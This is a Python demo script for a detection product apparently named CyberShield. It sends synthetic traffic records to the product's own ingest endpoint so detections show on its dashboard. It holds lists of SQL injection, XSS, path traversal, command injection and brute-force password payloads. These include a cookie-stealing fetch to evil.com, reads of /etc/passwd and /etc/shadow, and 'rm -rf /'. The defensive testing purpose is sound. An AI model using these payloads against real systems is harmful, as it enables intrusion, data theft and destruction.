"""
CyberShield Attack Simulator
==============================
Sends realistic attack & normal traffic to the /api/ingest endpoint
so you can watch real-time detection on the dashboard.

Usage:
    python attack_simulator.py --key cs_live_YOUR_API_KEY

Arguments:
    --key       (required) Your site API key from the dashboard
    --endpoint  CyberShield backend URL (default: http://localhost:5000)
    --mode      all | attacks | normal | specific attack type
                Choices: all, sqli, xss, brute_force, path_traversal,
                         cmd_injection, normal, mixed
    --count     Number of requests to send (default: 30)
    --delay     Seconds between requests (default: 0.5)

Examples:
    # Send a mix of attacks and normal traffic (best for dashboard demo)
    python attack_simulator.py --key cs_live_xxxx

    # Send only SQL injection attacks (20 of them, fast)
    python attack_simulator.py --key cs_live_xxxx --mode sqli --count 20 --delay 0.2

    # Simulate a brute-force burst
    python attack_simulator.py --key cs_live_xxxx --mode brute_force --count 50 --delay 0.1
"""

import argparse
import random
import time
import sys

try:
    import requests
except ImportError:
    print("[!] 'requests' not installed. Run: pip install requests")
    sys.exit(1)

# ── Attack payloads ────────────────────────────────────────────────────────────

SQLI_PAYLOADS = [
    {"path": "/login", "method": "POST", "payload": {"username": "' OR 1=1 --", "password": "x"}},
    {"path": "/search", "method": "GET", "payload": {"q": "1 UNION SELECT username,password FROM users--"}},
    {"path": "/products", "method": "GET", "payload": {"id": "1'; DROP TABLE users;--"}},
    {"path": "/api/users", "method": "POST", "payload": {"filter": "' OR 'a'='a"}},
    {"path": "/login", "method": "POST", "payload": {"username": "admin'--", "password": "anything"}},
]

XSS_PAYLOADS = [
    {"path": "/comment", "method": "POST", "payload": {"body": "<script>document.cookie='stolen='+document.cookie</script>"}},
    {"path": "/search", "method": "GET", "payload": {"q": "<img src=x onerror=alert('XSS')>"}},
    {"path": "/profile", "method": "PUT", "payload": {"bio": "javascript:alert(document.domain)"}},
    {"path": "/feedback", "method": "POST", "payload": {"text": "<svg onload=fetch('https://evil.com?c='+document.cookie)>"}},
]

PATH_TRAVERSAL_PAYLOADS = [
    {"path": "/download?file=../../../../etc/passwd", "method": "GET", "payload": {}},
    {"path": "/static/../../../etc/shadow", "method": "GET", "payload": {}},
    {"path": "/read", "method": "GET", "payload": {"filename": "../../config/database.yml"}},
    {"path": "/files/..%2F..%2F..%2Fetc%2Fhosts", "method": "GET", "payload": {}},
]

CMD_INJECTION_PAYLOADS = [
    {"path": "/ping", "method": "POST", "payload": {"host": "localhost; cat /etc/passwd"}},
    {"path": "/tools/lookup", "method": "GET", "payload": {"domain": "google.com && id"}},
    {"path": "/api/run", "method": "POST", "payload": {"cmd": "ls -la; whoami; id"}},
    {"path": "/convert", "method": "POST", "payload": {"input": "file.txt | rm -rf /"}},
]

BRUTE_FORCE_IPS = [f"192.168.{random.randint(1,254)}.{random.randint(1,254)}" for _ in range(5)]
BRUTE_FORCE_PAYLOADS = [
    {"path": "/login", "method": "POST", "payload": {"username": "admin", "password": pw}}
    for pw in ["password", "123456", "admin123", "letmein", "qwerty", "password1",
               "admin", "root", "test", "1234", "pass123", "welcome"]
]

NORMAL_PAYLOADS = [
    {"path": "/", "method": "GET", "payload": {}},
    {"path": "/about", "method": "GET", "payload": {}},
    {"path": "/products", "method": "GET", "payload": {}},
    {"path": "/api/products", "method": "GET", "payload": {}},
    {"path": "/contact", "method": "GET", "payload": {}},
    {"path": "/login", "method": "GET", "payload": {}},
    {"path": "/api/search", "method": "GET", "payload": {"q": "laptop"}},
    {"path": "/api/user/profile", "method": "GET", "payload": {}},
    {"path": "/checkout", "method": "POST", "payload": {"items": [{"id": 1, "qty": 2}]}},
    {"path": "/api/reviews", "method": "POST", "payload": {"rating": 5, "text": "Great product!"}},
]

NORMAL_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
]

ATTACK_USER_AGENTS = [
    "sqlmap/1.7.8#stable (https://sqlmap.org)",
    "Nikto/2.1.6",
    "curl/7.68.0",
    "python-requests/2.28.1",
    "Acunetix Web Vulnerability Scanner/14",
    "masscan/1.3",
]

# ── Color output ───────────────────────────────────────────────────────────────

def red(s):    return f"\033[91m{s}\033[0m"
def green(s):  return f"\033[92m{s}\033[0m"
def yellow(s): return f"\033[93m{s}\033[0m"
def cyan(s):   return f"\033[96m{s}\033[0m"
def bold(s):   return f"\033[1m{s}\033[0m"

# ── Core sender ────────────────────────────────────────────────────────────────

def send_request(endpoint, api_key, ip, user_agent, path, method, payload, label=""):
    url = f"{endpoint}/api/ingest"
    body = {
        "ip": ip,
        "user_agent": user_agent,
        "path": path,
        "method": method,
        "payload": payload,
        "headers": {"host": "my-site.com", "accept": "application/json"},
        "session_id": f"sess_{random.randint(1000, 9999)}",
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
    }
    try:
        resp = requests.post(url, json=body, headers={"X-CS-API-Key": api_key}, timeout=5)
        result = resp.json()
        score = result.get("risk_score", 0)
        action = result.get("action", "?")
        attack_type = result.get("attack_type", "NORMAL")
        severity = result.get("severity", "-")

        if action == "block":
            status = red(f"🚫 BLOCKED [{severity}]")
        elif score >= 40:
            status = yellow(f"⚠️  FLAGGED [{severity}]")
        else:
            status = green(f"✅ ALLOWED")

        print(f"  {status} | Score: {bold(str(round(score))):<6} | Type: {cyan(attack_type or 'NORMAL'):<20} | IP: {ip:<16} | {method} {path[:40]}")
        return result
    except requests.exceptions.ConnectionError:
        print(red("  [ERROR] Cannot connect to backend. Is it running on port 5000?"))
        return None
    except Exception as e:
        print(red(f"  [ERROR] {e}"))
        return None

# ── Attack scenarios ───────────────────────────────────────────────────────────

def run_sqli(endpoint, api_key, count):
    print(bold(yellow("\n[ SQL INJECTION ATTACK BURST ]")))
    ip = f"203.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    for i in range(count):
        p = random.choice(SQLI_PAYLOADS)
        send_request(endpoint, api_key, ip, random.choice(ATTACK_USER_AGENTS), p["path"], p["method"], p["payload"])

def run_xss(endpoint, api_key, count):
    print(bold(yellow("\n[ XSS ATTACK BURST ]")))
    ip = f"45.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    for i in range(count):
        p = random.choice(XSS_PAYLOADS)
        send_request(endpoint, api_key, ip, random.choice(ATTACK_USER_AGENTS), p["path"], p["method"], p["payload"])

def run_path_traversal(endpoint, api_key, count):
    print(bold(yellow("\n[ PATH TRAVERSAL ATTACK BURST ]")))
    ip = f"91.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    for i in range(count):
        p = random.choice(PATH_TRAVERSAL_PAYLOADS)
        send_request(endpoint, api_key, ip, random.choice(ATTACK_USER_AGENTS), p["path"], p["method"], p["payload"])

def run_cmd_injection(endpoint, api_key, count):
    print(bold(yellow("\n[ COMMAND INJECTION ATTACK BURST ]")))
    ip = f"178.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    for i in range(count):
        p = random.choice(CMD_INJECTION_PAYLOADS)
        send_request(endpoint, api_key, ip, random.choice(ATTACK_USER_AGENTS), p["path"], p["method"], p["payload"])

def run_brute_force(endpoint, api_key, count):
    print(bold(yellow("\n[ BRUTE FORCE LOGIN ATTACK ]")))
    # Same IP hammering login repeatedly — triggers rate limit detection
    ip = f"112.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    for i in range(count):
        p = BRUTE_FORCE_PAYLOADS[i % len(BRUTE_FORCE_PAYLOADS)]
        send_request(endpoint, api_key, ip, "python-requests/2.28.1", p["path"], p["method"], p["payload"])

def run_normal(endpoint, api_key, count):
    print(bold(green("\n[ NORMAL USER TRAFFIC ]")))
    for i in range(count):
        ip = f"192.168.{random.randint(1,10)}.{random.randint(1,254)}"
        p = random.choice(NORMAL_PAYLOADS)
        send_request(endpoint, api_key, ip, random.choice(NORMAL_USER_AGENTS), p["path"], p["method"], p["payload"])

def run_mixed(endpoint, api_key, count, delay):
    """Interleaves attacks and normal traffic for a realistic demo."""
    print(bold(cyan("\n[ MIXED TRAFFIC SIMULATION — Best for dashboard demo! ]")))
    attack_pool = SQLI_PAYLOADS + XSS_PAYLOADS + PATH_TRAVERSAL_PAYLOADS + CMD_INJECTION_PAYLOADS
    attack_ips  = [f"{random.randint(10,200)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}" for _ in range(6)]
    normal_ips  = [f"192.168.{random.randint(1,5)}.{random.randint(10,200)}" for _ in range(10)]

    for i in range(count):
        is_attack = random.random() < 0.4   # 40% attacks, 60% normal
        if is_attack:
            p = random.choice(attack_pool)
            ip = random.choice(attack_ips)
            ua = random.choice(ATTACK_USER_AGENTS)
        else:
            p = random.choice(NORMAL_PAYLOADS)
            ip = random.choice(normal_ips)
            ua = random.choice(NORMAL_USER_AGENTS)
        send_request(endpoint, api_key, ip, ua, p["path"], p["method"], p["payload"])
        time.sleep(delay)

# ── Main ───────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="CyberShield Attack Simulator")
    parser.add_argument("--key", required=True, help="Your site API key (cs_live_...)")
    parser.add_argument("--endpoint", default="http://localhost:5000", help="CyberShield backend URL")
    parser.add_argument("--mode", default="mixed",
                        choices=["all", "mixed", "sqli", "xss", "brute_force",
                                 "path_traversal", "cmd_injection", "normal"],
                        help="Type of traffic to simulate")
    parser.add_argument("--count", type=int, default=30, help="Number of requests")
    parser.add_argument("--delay", type=float, default=0.5, help="Delay between requests (seconds)")
    args = parser.parse_args()

    print(bold(cyan("\n╔══════════════════════════════════════════════════════╗")))
    print(bold(cyan("║        CyberShield Attack Simulator v1.0             ║")))
    print(bold(cyan("╚══════════════════════════════════════════════════════╝")))
    print(f"  Endpoint : {args.endpoint}")
    print(f"  API Key  : {args.key[:20]}...")
    print(f"  Mode     : {args.mode}")
    print(f"  Count    : {args.count}")
    print(f"  Delay    : {args.delay}s\n")
    print("  Watching the dashboard at http://localhost:3000 ? Open it now!\n")
    print("─" * 70)

    if args.mode == "sqli":
        run_sqli(args.endpoint, args.key, args.count)
    elif args.mode == "xss":
        run_xss(args.endpoint, args.key, args.count)
    elif args.mode == "path_traversal":
        run_path_traversal(args.endpoint, args.key, args.count)
    elif args.mode == "cmd_injection":
        run_cmd_injection(args.endpoint, args.key, args.count)
    elif args.mode == "brute_force":
        run_brute_force(args.endpoint, args.key, args.count)
    elif args.mode == "normal":
        run_normal(args.endpoint, args.key, args.count)
    elif args.mode == "mixed":
        run_mixed(args.endpoint, args.key, args.count, args.delay)
    elif args.mode == "all":
        per = max(5, args.count // 5)
        run_normal(args.endpoint, args.key, per)
        run_sqli(args.endpoint, args.key, per)
        run_xss(args.endpoint, args.key, per)
        run_brute_force(args.endpoint, args.key, per)
        run_path_traversal(args.endpoint, args.key, per)
        run_cmd_injection(args.endpoint, args.key, per)

    print("\n" + "─" * 70)
    print(bold(green("\n✅ Simulation complete! Check your CyberShield dashboard.\n")))

if __name__ == "__main__":
    main()
